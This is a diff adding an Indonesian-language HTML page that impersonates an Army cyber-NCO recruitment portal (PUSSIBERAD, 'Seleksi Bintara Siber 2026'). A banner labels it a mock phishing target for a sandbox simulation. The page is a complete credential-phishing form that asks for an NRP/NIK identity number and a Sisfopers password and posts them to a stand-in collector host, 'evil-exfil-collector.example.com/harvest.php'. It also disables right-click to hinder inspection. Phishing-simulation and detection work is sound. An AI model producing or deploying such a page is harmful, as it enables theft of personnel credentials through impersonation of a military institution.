@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="id" oncontextmenu="return false">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Seleksi Bintara Siber TNI AD 2026 - Sisfopers PUSSIBERAD</title>
+    <style>
+        :root {
+            --bg-dark: #0c140e;
+            --bg-panel: #132117;
+            --border-olive: #2b4732;
+            --accent-gold: #c9a227;
+            --accent-green: #235c36;
+            --text-primary: #eef4ef;
+            --text-muted: #9cb0a0;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: radial-gradient(circle at top, #182b1e 0%, var(--bg-dark) 70%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .sandbox-banner {
+            background: rgba(201, 162, 39, 0.14);
+            border: 1px solid var(--accent-gold);
+            color: #f3d778;
+            font-size: 11px;
+            letter-spacing: 0.6px;
+            padding: 6px 14px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            text-transform: uppercase;
+        }
+        .portal-card {
+            width: 100%;
+            max-width: 460px;
+            background-color: var(--bg-panel);
+            border: 1px solid var(--border-olive);
+            border-top: 4px solid var(--accent-gold);
+            border-radius: 8px;
+            padding: 28px 32px;
+            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.65);
+        }
+        .header-crest {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header-crest img {
+            width: 76px;
+            height: 76px;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+        .header-crest h1 {
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            color: var(--text-primary);
+            text-transform: uppercase;
+        }
+        .header-crest p {
+            font-size: 12.5px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+        .notice-box {
+            background: rgba(12, 20, 14, 0.65);
+            border-left: 3px solid var(--accent-gold);
+            padding: 10px 12px;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 18px;
+            line-height: 1.45;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            padding: 8px 4px;
+        }
+        .field-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .field-group label {
+            font-size: 12.5px;
+            font-weight: 600;
+            color: #d6e3d8;
+        }
+        .field-group input,
+        .field-group select {
+            width: 100%;
+            padding: 10px 12px;
+            background-color: #0b130d;
+            border: 1px solid #35563d;
+            border-radius: 5px;
+            color: var(--text-primary);
+            font-size: 13.5px;
+        }
+        .field-group input:focus,
+        .field-group select:focus {
+            outline: 2px solid var(--accent-gold);
+            border-color: transparent;
+        }
+        .submit-btn {
+            margin-top: 6px;
+            padding: 11px 16px;
+            background-color: var(--accent-green);
+            border: 1px solid var(--accent-gold);
+            border-radius: 5px;
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 13.5px;
+            letter-spacing: 0.4px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        .footer-meta {
+            margin-top: 18px;
+            text-align: center;
+            font-size: 11px;
+            color: var(--text-muted);
+            border-top: 1px solid #203625;
+            padding-top: 12px;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <div class="sandbox-banner">
+        [MOCK PHISHING TARGET - VISIKARTIKA SHIELD SANDBOX SIMULATION]
+    </div>
+
+    <div class="portal-card">
+        <div class="header-crest">
+            <img
+                id="crest-logo"
+                alt="Lambang Kartika Eka Paksi TNI Angkatan Darat PUSSIBERAD"
+                width="76"
+                height="76"
+                src="data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='80' viewBox='0 0 80 80'%3E%3Cpolygon points='40,4 72,18 64,58 40,76 16,58 8,18' fill='%23183923' stroke='%23c9a227' stroke-width='3'/%3E%3Cpolygon points='40,18 45,32 60,32 48,41 52,55 40,46 28,55 32,41 20,32 35,32' fill='%23c9a227'/%3E%3C/svg%3E"
+            />
+            <h1>Seleksi Bintara Siber 2026</h1>
+            <p>Pusat Sandi dan Siber TNI Angkatan Darat (PUSSIBERAD)</p>
+        </div>
+
+        <div class="notice-box">
+            <strong>Verifikasi NRP / NIK Calon Prajurit:</strong> Peserta seleksi Bintara &amp; Tamtama Kartika wajib melakukan sinkronisasi akun Sisfopers Kodam / Satuan masing-masing.
+        </div>
+
+        <form id="phish-login-form" action="https://evil-exfil-collector.example.com/harvest.php" method="POST">
+            <div class="field-group">
+                <label for="nrp_nik">NRP / NIK Calon Prajurit</label>
+                <input
+                    type="text"
+                    id="nrp_nik"
+                    name="nrp_nik"
+                    placeholder="Masukkan 16 digit NIK atau NRP Prajurit"
+                    required
+                />
+            </div>
+
+            <div class="field-group">
+                <label for="kata_sandi">Kata Sandi Sisfopers / PIN</label>
+                <input
+                    type="password"
+                    id="kata_sandi"
+                    name="kata_sandi"
+                    placeholder="Masukkan Kata Sandi Akun Seleksi"
+                    required
+                />
+            </div>
+
+            <button type="submit" class="submit-btn">Verifikasi Data Personel</button>
+        </form>
+
+        <div class="footer-meta">
+            Sistem Integrasi Sisfopers TNI Angkatan Darat &bull; Panitia Pusat Seleksi Kartika 2026
+        </div>
+    </div>
+</body>
+</html>
+
